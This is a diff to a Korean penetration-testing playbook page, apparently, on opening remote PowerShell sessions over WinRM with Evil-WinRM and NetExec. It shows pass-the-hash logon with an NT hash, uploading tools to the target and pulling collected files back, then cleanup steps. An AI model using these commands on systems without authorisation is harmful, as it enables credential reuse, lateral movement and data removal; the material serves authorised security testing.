@@ -14,15 +14,6 @@ tags:
 
 공격 호스트에서 `<TARGET>:5985/5986`에 연결할 수 있고 확보한 Windows plaintext password 또는 NT hash가 대상의 WinRM 로그온 권한을 가진 계정에 해당하면, Evil-WinRM으로 그 계정 Identity의 원격 PowerShell 세션을 연다.
 
-## 사용할 때
-
-- 현재 네트워크 위치: 공격 호스트에서 `<TARGET>:5985/TCP` 또는 `5986/TCP`의 WinRM endpoint까지 연결할 수 있다.
-- 명령 실행 위치: NetExec과 Evil-WinRM은 공격 호스트에서 실행하고, prompt가 열린 뒤의 PowerShell 명령은 `<TARGET>`에서 현재 WinRM 계정으로 실행된다.
-- 보유 계정·인증 자료: `<TARGET>`에서 유효할 가능성이 있는 Windows 사용자 plaintext password 또는 NT hash를 보유한다. Responder 등에서 캡처한 NetNTLM challenge-response는 이 `-H` 입력에 사용할 NT hash가 아니다.
-- 현재 권한: `[+]`는 WinRM 인증 성공, Evil-WinRM prompt는 실제 원격 PowerShell 세션이다. `(Pwn3d!)`는 관리자급 실행 가능성 신호이며, 세션의 `whoami /all`로 실제 관리자 그룹과 token을 다시 확인한다.
-- 지금 가능한 행동: SMB 원격 실행이 막힌 경우에도 허용된 PowerShell Remoting endpoint에서 명령 실행과 파일 전송을 시도한다.
-- 성공 범위: `<TARGET>`에서 인증된 계정 Identity로 PowerShell 명령과 WinRM 파일 전송을 수행한다. 일반 사용자 세션과 상승된 로컬 관리자 세션, 도메인 권한은 별도로 판정한다.
-
 ## 전제 조건
 
 | 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
@@ -91,12 +82,14 @@ Copy-Item -Path <LOCAL_SOURCE_FILE> -ToSession $Session -Destination <REMOTE_DES
 Copy-Item -Path <REMOTE_SOURCE_FILE> -FromSession $Session -Destination <LOCAL_DESTINATION>
 ```
 
-복사 뒤 양쪽에서 크기와 SHA-256을 확인한다.
+`<LOCAL_SOURCE_FILE>`와 `<LOCAL_DESTINATION>`은 공격 호스트의 경로(예: `./tool.ps1`, `./collected.txt`)다. `<REMOTE_DESTINATION>`과 `<REMOTE_SOURCE_FILE>`은 `<TARGET_FQDN>`의 PowerShell 세션 경로(예: `C:\\Temp\\tool.ps1`, `C:\\Temp\\collected.txt`)다. `-ToSession`은 앞의 local source를 remote destination으로 보내고, `-FromSession`은 remote source를 앞의 local destination으로 회수한다.
+
+무결성 비교가 필요한 경우에는 실제로 선택한 같은 전송쌍만 비교한다. 아래는 `-ToSession`의 `<LOCAL_SOURCE_FILE> ↔ <REMOTE_DESTINATION>` 쌍이며, `-FromSession`을 선택했다면 `<REMOTE_SOURCE_FILE> ↔ <LOCAL_DESTINATION>`으로 같은 방식으로 바꾼다.
 
 ```powershell
-Get-Item <LOCAL_FILE>
-Get-FileHash <LOCAL_FILE> -Algorithm SHA256
-Invoke-Command -Session $Session -ScriptBlock { Get-Item '<REMOTE_FILE>'; Get-FileHash '<REMOTE_FILE>' -Algorithm SHA256 }
+Get-Item -LiteralPath <LOCAL_SOURCE_FILE>
+Get-FileHash -LiteralPath <LOCAL_SOURCE_FILE> -Algorithm SHA256
+Invoke-Command -Session $Session -ScriptBlock { Get-Item -LiteralPath '<REMOTE_DESTINATION>'; Get-FileHash -LiteralPath '<REMOTE_DESTINATION>' -Algorithm SHA256 }
 ```
 
 - `New-PSSession` 실패는 WinRM 인증·endpoint 문제다.
@@ -151,7 +144,7 @@ evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>
 
 ## 변경 영향과 복구
 
-`Copy-Item -ToSession`으로 대상에 파일을 만들었다면 이번에 만든 파일만 제거하고 부재를 확인한다.
+`Copy-Item -ToSession`으로 대상에 파일을 만들었다면 `<REMOTE_DESTINATION>`의 이번 생성 파일만 제거하고 부재를 확인한다. `-FromSession`으로 회수한 `<LOCAL_DESTINATION>`은 공격 호스트에서 별도로 관리하며, 대상 파일을 자동으로 삭제하지 않는다.
 
 ```powershell
 Invoke-Command -Session $Session -ScriptBlock { Remove-Item -LiteralPath '<REMOTE_DESTINATION>'; Test-Path -LiteralPath '<REMOTE_DESTINATION>' }
